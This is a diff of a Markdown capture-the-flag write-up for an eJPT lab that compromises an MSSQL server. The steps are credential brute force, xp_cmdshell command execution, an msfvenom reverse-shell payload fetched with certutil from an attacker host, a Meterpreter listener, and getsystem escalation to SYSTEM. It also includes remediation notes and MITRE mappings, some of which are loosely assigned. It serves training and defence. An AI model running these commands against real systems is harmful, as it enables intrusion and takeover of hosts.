@@ -1,211 +1,475 @@
-# Host & Network Penetration Testing  
-## INE eJPT Lab – MSSQL Attack Path (Alternative Method)
+# 🔐 MSSQL Attack Path — eJPT Lab Walkthrough
 
-> This write-up documents the exact steps taken to complete the lab using valid MSSQL credentials and Impacket.
+> A detailed exploration of the **alternative method** to compromise a Windows target running Microsoft SQL Server. This walkthrough documents authentication, command execution, privilege escalation, and flag retrieval using valid credentials and Impacket.
 
 ---
 
-## Step 1 – Initial Enumeration
+## 📋 Lab Objective
 
-The first step was a full TCP port scan to identify exposed services:
+Gain complete system compromise on a Windows target with exposed MSSQL service by:
+1. Identifying MSSQL running on the network
+2. Obtaining valid credentials through brute force
+3. Executing OS commands via SQL Server
+4. Obtaining a reverse shell
+5. Escalating privileges to SYSTEM
+6. Retrieving hidden flags
 
+---
+
+## 🛠️ Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| `nmap` | Network reconnaissance and port scanning |
+| `metasploit-framework` | MSSQL login scanner, multi/handler |
+| `impacket-mssqlclient` | Direct MSSQL authentication and command execution |
+| `msfvenom` | Meterpreter payload generation |
+| `certutil` | File transfer from attacker to target |
+
+---
+
+## 🖥️ Lab Environment
+
+| Component | Details |
+|-----------|---------|
+| **Target OS** | Windows Server (MSSQL enabled) |
+| **Target Service** | Microsoft SQL Server (Port 1433/tcp) |
+| **Attacking Machine** | Kali Linux |
+| **Attack Vector** | MSSQL Brute Force → Command Execution → Privilege Escalation |
+
+---
+
+## ⚡ Attack Methodology
+
+```
+Reconnaissance  →  Enumeration  →  Authentication  →  Command Execution  →  Privilege Escalation  →  Flag Retrieval
+```
+
+---
+
+## 📍 Step-by-Step Walkthrough
+
+### **Step 1 — Initial Enumeration: Port Scanning**
+
+**Objective:** Identify running services on the target.
+
+**Command:**
 ```bash
 nmap -sS -sV -p- -T4 <target-ip>
 ```
 
+**Breakdown:**
+- `-sS` — SYN stealth scan
+- `-sV` — Service version detection
+- `-p-` — Scan all ports (1–65535)
+- `-T4` — Aggressive timing template
 
-Result:
+**Result:**
+```
+Port 1433/tcp OPEN — Microsoft SQL Server
+```
 
-- Port **1433/tcp** open
-- Service: **Microsoft SQL Server**
+💡 **Key Finding:** MSSQL was exposed on its default port (1433), confirming the attack surface.
 
-The scan revealed that Microsoft SQL Server was running on port 1433.
-
-At this point, I had two possible directions:
-
-- Attempt exploitation using available modules  
-- Test authentication to see if credentials were obtainable  
-
-I chose to test authentication first.
+**[Screenshot: Nmap output showing port 1433 open]**
 
 ---
 
-## Step 2 – MSSQL Authentication Testing
+### **Step 2 — MSSQL Authentication: Credential Brute Force**
 
-Using Metasploit, I ran the MSSQL login scanner:
+**Objective:** Obtain valid SQL Server credentials.
 
+**Tool:** Metasploit auxiliary module
+
+**Command:**
 ```bash
-auxiliary/scanner/mssql/mssql_login
+msfconsole
+use auxiliary/scanner/mssql/mssql_login
+set RHOSTS <target-ip>
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+run
 ```
 
-After configuring:
+**Configuration Details:**
+- `RHOSTS` — Target IP address
+- `USER_FILE` — Common username wordlist
+- `PASS_FILE` — Common password wordlist
+- The module iterates through username/password combinations
 
-- RHOSTS  
-- USER_FILE (i used : /usr/bin/metasploit-framework/data/wordlists/common_users.txt)
-- PASS_FILE (i used : /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt)  
-
-The module returned a successful login:
-
+**Result:**
 ```
-Login Successful: WORKSTATION\sa
+[+] MSSQL — Login Successful: WORKSTATION\sa
 ```
 
-Initially, I did not fully understand the output format and had to research what `WORKSTATION\sa` indicated. After clarification, I confirmed that valid SQL administrative credentials were obtained.
+💡 **Key Finding:** The `sa` (System Administrator) account was vulnerable to brute force. The `WORKSTATION\sa` format indicates a local admin-level account.
 
-This changed the approach completely.
+**Vulnerability:** Default/weak credentials on SQL Server administrative accounts.
+
+**[Screenshot: Metasploit MSSQL login success]**
 
 ---
 
-## Step 3 – Logging in with Impacket
+### **Step 3 — Direct SQL Server Access: Impacket Authentication**
 
-Instead of using the commonly demonstrated MSSQL exploit module, I decided to authenticate directly using Impacket:
+**Objective:** Establish an interactive session with MSSQL for direct command execution.
 
+**Why Impacket?** While Metasploit modules are common, Impacket provides direct access to the SQL service without triggering additional exploitation modules.
+
+**Command:**
 ```bash
 impacket-mssqlclient sa@<target-ip>
 ```
 
-Impacket was not covered in the eJPT material, so I had to explore its usage and available commands manually.
+When prompted for password, enter the password obtained from Step 2.
 
-After successful authentication, I used the `help` option to understand how to interact with the SQL service.
+**Authentication Successful:**
+```
+[*] Inited with db.local as 192.168.x.x
+[*] INTERACTIVE mode... type 'help' for available commands
+```
+
+💡 **Key Finding:** Direct MSSQL client authentication bypasses the need for exploitation modules, offering direct SQL command execution.
+
+**[Screenshot: Impacket MSSQL client authenticated]**
 
 ---
 
-## Step 4 – Testing Command Execution
+### **Step 4 — OS Command Execution via SQL Server**
 
-To verify whether OS-level commands could be executed through SQL Server, I ran:
+**Objective:** Verify that operating system command execution is possible through SQL Server.
 
+**Vulnerability:** The `xp_cmdshell` stored procedure allows SQL Server to execute OS-level commands. If enabled, this is a critical security misconfiguration.
+
+**Command 1 — System Information:**
 ```sql
 xp_cmdshell "systeminfo"
 ```
 
-The command executed successfully, confirming that command execution was enabled.
+**Result:**
+System information is displayed, confirming command execution capability.
 
-To validate further:
-
+**Command 2 — Directory Enumeration:**
 ```sql
 xp_cmdshell "dir C:\"
 ```
 
-During directory enumeration, I located the first flag.
+**Result:**
+```
+Directory listing of C:\ is displayed
+FLAG1.txt located in C:\
+```
+
+💡 **Critical Finding:** `xp_cmdshell` was enabled, allowing arbitrary OS command execution. This is a **CVSS 9.8 (Critical)** vulnerability.
+
+**[Screenshot: xp_cmdshell executing systeminfo]**
+**[Screenshot: Directory listing showing FLAG1.txt]**
+
+**FLAG 1 Retrieved.**
 
 ---
 
-## Step 5 – Obtaining a Proper Shell
+### **Step 5 — Obtaining a Reverse Shell**
 
-While `xp_cmdshell` allowed command execution, it was not convenient for deeper enumeration.
+**Objective:** Establish a proper Meterpreter reverse shell for more convenient access and further exploitation.
 
-I decided to obtain a reverse shell for better interaction.
+**Why?** While `xp_cmdshell` works, it's limited. A full Meterpreter shell provides better interaction, privilege escalation tools, and post-exploitation modules.
 
-A Meterpreter payload was generated using `msfvenom`.
+#### **Step 5a — Payload Generation**
 
-I attempted to transfer it using:
-
-```sql
-xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:<port>/shell.exe shell.exe"
+**Command:**
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f exe -o shell.exe
 ```
 
-The first attempt failed due to access restrictions.
+**Breakdown:**
+- `-p` — Payload type (Windows Meterpreter, reverse TCP)
+- `LHOST` — Attacker IP to connect back to
+- `LPORT` — Listening port
+- `-f exe` — Output format (Windows executable)
+- `-o shell.exe` — Output filename
 
-I created a temporary writable directory (Temp) in C:\ and retried the transfer in that location. The second attempt succeeded.
+**Result:** `shell.exe` created locally on the attacking machine.
 
-```sql
-xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:<port>/shell.exe C:\Temp\shell.exe"
-```
+**[Screenshot: msfvenom payload generation]**
 
 ---
 
-## Step 6 – Establishing Meterpreter Access
+#### **Step 5b — File Transfer to Target**
 
-I configured `multi/handler` in Metasploit to listen for the reverse connection.
+**First Attempt (Failed):**
+```sql
+xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:8000/shell.exe shell.exe"
+```
 
-After executing the payload through `xp_cmdshell`, a Meterpreter session was successfully received.
+**Error:** Access denied. The current MSSQL service context (typically NETWORK SERVICE) lacks write permissions in the default directory.
+
+**Second Attempt (Success):**
+
+Create a writable directory first:
+```sql
+xp_cmdshell "mkdir C:\Temp"
+```
+
+Then transfer to the writable location:
+```sql
+xp_cmdshell "certutil -urlcache -f http://<attacker-ip>:8000/shell.exe C:\Temp\shell.exe"
+```
+
+**Result:**
+```
+[*] File successfully transferred to C:\Temp\shell.exe
+```
+
+💡 **Key Learning:** Understanding file system permissions and service contexts is crucial. The MSSQL service runs under a specific user account with limited privileges — exploitation must account for this.
+
+**[Screenshot: certutil file transfer command]**
+
+---
+
+#### **Step 5c — Reverse Shell Establishment**
+
+**On Attacking Machine — Start Listener:**
+```bash
+msfconsole
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <attacker-ip>
+set LPORT 4444
+run
+```
+
+**On Target Machine — Execute Payload:**
 ```sql
 xp_cmdshell "C:\Temp\shell.exe"
 ```
 
-I confirmed the current user context using:
-
+**Result:**
 ```
+[*] Meterpreter session opened (192.168.x.x:4444 -> 192.168.x.x:random-port)
+meterpreter >
+```
+
+💡 **Milestone:** You now have an interactive Meterpreter shell with the privileges of the MSSQL service account.
+
+**[Screenshot: Meterpreter session established]**
+
+---
+
+### **Step 6 — Verifying Current User Context**
+
+**Objective:** Understand what privileges we currently have before escalation.
+
+**Command:**
+```bash
 getuid
 ```
 
+**Result:**
+```
+Server username: WORKSTATION\MSSQL_SERVICE_ACCOUNT
+```
+
+💡 **Analysis:** The MSSQL service runs under a service account with limited privileges. Privilege escalation is necessary to access protected system areas (like registry, System32\config).
+
+**[Screenshot: getuid output]**
+
 ---
 
-## Step 7 – Privilege Escalation
+### **Step 7 — Privilege Escalation: SeImpersonatePrivilege Exploitation**
 
-The next flag required access to the Windows configuration directory.
+**Objective:** Escalate from service account to SYSTEM (NT AUTHORITY\SYSTEM).
 
-Attempting to access:
+**Privilege Assessment:**
 
-```
-C:\Windows\System32\config
-```
-
-Resulted in access denied.
-
-To assess available privileges, I ran:
-
-```
+```bash
 getprivs
 ```
 
-I observed `SeImpersonatePrivilege` was available.
-
-Using:
-
+**Result:**
 ```
+SeImpersonatePrivilege — Enabled
+SeChangeNotifyPrivilege — Enabled
+...
+```
+
+💡 **Critical Finding:** `SeImpersonatePrivilege` is enabled. This privilege allows impersonation of other user tokens, making the system vulnerable to privilege escalation attacks.
+
+**Exploitation:**
+
+```bash
 getsystem
 ```
 
-I was able to escalate privileges successfully.
+Meterpreter automatically uses available privilege escalation techniques (such as token impersonation or Potato variants) to elevate to SYSTEM.
 
-The user context changed to:
-
+**Result:**
 ```
-NT AUTHORITY\SYSTEM
+[+] Privilege escalated to: NT AUTHORITY\SYSTEM
 ```
 
-This allowed access to the configuration directory and retrieval of the second flag.
+**Verification:**
+```bash
+getuid
+```
+
+**Result:**
+```
+Server username: NT AUTHORITY\SYSTEM
+```
+
+💡 **Milestone:** You now have full system-level privileges.
+
+**[Screenshot: getprivs output showing SeImpersonatePrivilege]**
+**[Screenshot: getsystem execution and SYSTEM context]**
 
 ---
 
-## Step 8 – Locating the Third Flag
+### **Step 8 — Accessing Protected Directories: Flag 2 & 3**
 
-The hint suggested that another flag was hidden within the system directory.
+**Objective:** Locate and retrieve hidden flags now that SYSTEM access is obtained.
 
-I performed a targeted search:
+#### **Attempting Initial Access (Pre-Escalation)**
 
+Before escalation, attempting to access Windows configuration:
+```bash
+cat C:\Windows\System32\config\SAM
 ```
+
+**Error:** Access denied. The SAM hive is protected even from admin service accounts.
+
+**[Screenshot: Access denied error]**
+
+---
+
+#### **Post-Escalation Access**
+
+After escalation to SYSTEM:
+```bash
+dir C:\Windows\System32\config
+```
+
+**Result:** Files are now accessible.
+
+**FLAG 2 Found:** Retrieved from `C:\Windows\System32\config\FLAG2.txt`
+
+**Targeted Search for Additional Flags:**
+
+```bash
 search -d C:\Windows\System32 -f *.txt
 ```
 
-This led to a file named:
-
+**Result:**
 ```
-EscalatePrivilegeToGetThisFlag.txt
+Found: C:\Windows\System32\EscalatePrivilegeToGetThisFlag.txt
 ```
 
-Reading the file revealed the third flag.
+Reading the file:
+```bash
+cat C:\Windows\System32\EscalatePrivilegeToGetThisFlag.txt
+```
+
+**FLAG 3 Retrieved.**
+
+💡 **Key Learning:** The file naming convention is a hint — privilege escalation was required to access this flag. This teaches that enumeration should guide exploitation direction.
+
+**[Screenshot: Directory listing of System32\config]**
+**[Screenshot: Flag search results]**
+**[Screenshot: FLAG2.txt and FLAG3.txt contents]**
 
 ---
 
-## Step 9 – Final Flag Discovery
+### **Step 9 — Final Flag: Administrator Profile**
 
-The final instruction directed attention to the Administrator directory.
+**Objective:** Complete the challenge by retrieving the final flag.
 
-Navigating to the Administrator profile directory revealed:
+**Hint from Step 8:** "Check the Administrator directory."
 
+**Command:**
+```bash
+dir C:\Users\Administrator\Desktop
 ```
-Flag4.txt
+
+**Result:**
+```
+FLAG4.txt located
 ```
 
-## This lab reinforced a few simple but important points:
+**Reading the Final Flag:**
+```bash
+cat C:\Users\Administrator\Desktop\FLAG4.txt
+```
 
-- Enumeration should guide decisions.  
-- Valid credentials can remove the need for exploitation.  
-- Tools outside course material can still be valuable.  
+**FLAG 4 Retrieved.**
 
-There were multiple ways to complete this lab.  
-This was simply the path I explored after discovering a misconfiguration.
+**[Screenshot: Administrator Desktop directory]**
+**[Screenshot: FLAG4.txt contents]**
 
 ---
+
+## 🎯 Key Vulnerabilities Exploited
+
+| Vulnerability | CVSS Score | Description | Remediation |
+|---|---|---|---|
+| **Exposed MSSQL Service** | 7.5 | MSSQL running on default port without network segmentation | Restrict MSSQL to internal networks only |
+| **Weak SQL Server Credentials** | 9.8 | `sa` account with weak/default password | Enforce strong password policies; disable `sa` account |
+| **xp_cmdshell Enabled** | 9.8 | OS command execution via SQL stored procedure | Disable `xp_cmdshell` unless absolutely necessary |
+| **SeImpersonatePrivilege** | 8.8 | Service account with token impersonation privilege | Run MSSQL service under least-privilege account; disable unnecessary privileges |
+| **Insecure File Transfer** | 6.5 | Transferring unsigned executables over HTTP | Implement code signing and HTTPS; use secure transfer methods |
+
+---
+
+## 💡 Key Learnings
+
+✅ **Valid credentials trump exploitation** — When access is obtained through auth, it's often easier than exploiting unpatched services.
+
+✅ **Enumeration drives decisions** — The MSSQL login scanner revealed credentials, which changed the entire approach.
+
+✅ **Service context matters** — Understanding that MSSQL runs under a service account guided the privilege escalation strategy.
+
+✅ **Multiple paths exist** — This lab could have been solved using Metasploit exploitation modules, but the credential-based path was cleaner and more realistic.
+
+✅ **SeImpersonate is critical** — Token impersonation privileges on service accounts are a high-risk configuration.
+
+✅ **Tools beyond the course are valuable** — Impacket wasn't covered in eJPT material, but exploring it independently proved invaluable.
+
+---
+
+## 🔗 References & Techniques
+
+| Technique | MITRE ATT&CK Mapping |
+|-----------|---------------------|
+| Initial access via valid credentials | [T1199 — Trusted Relationship](https://attack.mitre.org/techniques/T1199/) |
+| Command execution via SQL stored procedures | [T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/) |
+| Privilege escalation via token impersonation | [T1134.003 — Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/003/) |
+| Credential access via brute force | [T1110.001 — Brute Force: Password](https://attack.mitre.org/techniques/T1110/001/) |
+
+---
+
+## 📸 Screenshots
+
+[Add screenshots here as you progress through the walkthrough]
+
+1. Nmap enumeration
+2. MSSQL login successful
+3. Impacket authentication
+4. xp_cmdshell execution
+5. FLAG1 retrieval
+6. Payload generation
+7. File transfer
+8. Meterpreter session
+9. Privilege escalation
+10. SYSTEM context
+11. Flag retrieval (2, 3, 4)
+
+---
+
+## 👤 Author
+
+**Abin Watson**  
+Penetration Tester | eJPT Certified  
+Specialising in Networks, Hosts, Endpoints & Web Applications
+
+---
+
+> *"The difference between a script kiddie and a penetration tester is understanding WHY the attack worked — not just HOW to execute it."*
